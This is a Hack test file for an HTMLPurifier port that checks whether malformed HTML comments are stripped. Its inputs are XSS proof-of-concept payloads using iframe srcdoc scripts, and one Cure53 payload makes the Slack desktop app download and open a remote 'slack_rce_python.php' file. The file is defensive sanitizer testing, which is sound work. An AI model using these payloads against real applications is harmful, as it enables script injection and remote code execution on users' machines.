/* Created by Jake Polacek on 11/08/2021 */

namespace HTMLPurifier\_Private\Tests;

use function Facebook\FBExpect\expect;
use type Facebook\HackTest\HackTest;
use namespace HTMLPurifier;
use namespace HTMLPurifier\{Strategy, Token, Lexer};

class CommentRemovalTest extends HackTest {
	public function testSimplerFancyCommentRemoval(): void {
		echo "\nrunning testSimplerFancyCommentRemoval()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$purifier = new HTMLPurifier\HTMLPurifier($config);

		$dirty_html1 = '<!-->';
		$dirty_html2 = '<!--->';
		$dirty_html3 = '<!-- -->';
		$clean_html1 = $purifier->purify($dirty_html1);
		$clean_html2 = $purifier->purify($dirty_html2);
		$clean_html3 = $purifier->purify($dirty_html3);

		expect($clean_html1)->toEqual('');
		expect($clean_html2)->toEqual('');
		expect($clean_html3)->toEqual('');
	}

	public function testPoCFancyCommentRemoval(): void {
		echo "\nrunning testPoCFancyCommentRemoval()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = new HTMLPurifier\HTMLPurifier_Policy(dict['a' => vec['id', 'name', 'href', 'target', 'rel']]);

		$dirty_poc1 = '<!--><iframe srcdoc="<script>alert(document.domain)</script>">-->x';
		$dirty_poc2 = '<!---><iframe srcdoc="<script>alert(document.domain)</script>">-->x';
		$dirty_poc3 = '<!-- --!><iframe srcdoc="<script>alert(document.domain)</script>">-->x';
		$dirty_poc4 = '<!--><iframe srcdoc="<script>alert(document.domain)</script>"><!---->';
		$dirty_poc5 = '<!--><iframe srcdoc="<script>alert(document.domain)</script>">--!>';
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy);
		$clean_poc1 = $purifier->purify($dirty_poc1);
		$clean_poc2 = $purifier->purify($dirty_poc2);
		$clean_poc3 = $purifier->purify($dirty_poc3);
		$clean_poc4 = $purifier->purify($dirty_poc4);
		$clean_poc5 = $purifier->purify($dirty_poc5);
		expect($clean_poc1)->toEqual('x');
		expect($clean_poc2)->toEqual('x');
		expect($clean_poc3)->toEqual('x');
		expect($clean_poc4)->toEqual('');
		expect($clean_poc5)->toEqual('');
		echo "finished.\n\n";
	}

	public function testCure53EmailPurification(): void {
		echo "\nrunning testCure53EmailPurification()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$policy = new HTMLPurifier\HTMLPurifier_Policy(
			dict[
				'b' => vec[],
				'ul' => vec[],
				'li' => vec[],
				'ol' => vec[],
				'h2' => vec[],
				'h4' => vec[],
				'br' => vec[],
				'div' => vec[],
				'strong' => vec[],
				'del' => vec[],
				'em' => vec[],
				'pre' => vec[],
				'code' => vec[],
				'table' => vec[],
				'tbody' => vec[],
				'td' => vec[],
				'th' => vec[],
				'thead' => vec[],
				'tr' => vec[],
				'a' => vec['id', 'name', 'href', 'target', 'rel'],
				'h3' => vec['class'],
				'p' => vec['class'],
				'aside' => vec['class'],
				'img' => vec['src', 'alt', 'class', 'width', 'height', 'srcset', 'sizes'],
			],
		);

		$dirty_email1 = "<!--><script>
desktop.downloads.startDownload({
    id: 'cure53',
    teamId: 'cure53',
    url: 'https://vulnerabledoma.in/pen/slack_rce_python.php'
});
setTimeout(function(){
    desktop.downloads.openDownload('cure53','cure53');
},2000);
</script>-->x";
		$dirty_email2 =
			"<!--><iframe srcdoc='<a target='_top' href='https://files.slack.com/files-pri/[EMAIL1’s_URL_HERE]'>CLICK</a>'>-->x";
		$purifier = new HTMLPurifier\HTMLPurifier($config, $policy);
		$clean_email1 = $purifier->purify($dirty_email1);
		$clean_email2 = $purifier->purify($dirty_email2);
		expect($clean_email1)->toEqual('x');
		expect($clean_email2)->toEqual('x');
		echo "finished.\n\n";
	}

	public function testFancyNestedComments(): void {
		echo "\nrunning testFancyNestedComments()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$purifier = new HTMLPurifier\HTMLPurifier($config);
		$dirty_nested1 = '<!-<!-->->';
		$dirty_nested2 = '<!-- <!-- Hello --> -->';
		$dirty_nested3 = '<!--<!-->-->';

		$clean_nested1 = $purifier->purify($dirty_nested1);
		expect($clean_nested1)->toEqual('');

		$clean_nested2 = $purifier->purify($dirty_nested2);
		expect($clean_nested2)->toEqual('');

		$clean_nested3 = $purifier->purify($dirty_nested3);
		expect($clean_nested3)->toEqual('');
	}

	public function testLineBreakComments(): void {
		echo "\nrunning testLineBreakComments()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$purifier = new HTMLPurifier\HTMLPurifier($config);
		$dirty = '<!-->
<iframe srcdoc=
"<script>alert(document.domain)</script>">
-->x';

		$clean = $purifier->purify($dirty);
		expect($clean)->toEqual('x');
	}

	public function testValidCommentRemoval(): void {
		echo "\nrunning testValidCommentRemoval()...";
		$config = HTMLPurifier\HTMLPurifier_Config::createDefault();
		$purifier = new HTMLPurifier\HTMLPurifier($config);
		$html1 = '<!-- comment --><b>Hello World!</b>';
		$html2 = '<!-- begin --><b>Hello World!</b><!-- end -->';

		$clean1 = $purifier->purify($html1);
		expect($clean1)->toEqual('<b>Hello World!</b>');

		$clean2 = $purifier->purify($html2);
		expect($clean2)->toEqual('<b>Hello World!</b>');
	}
}
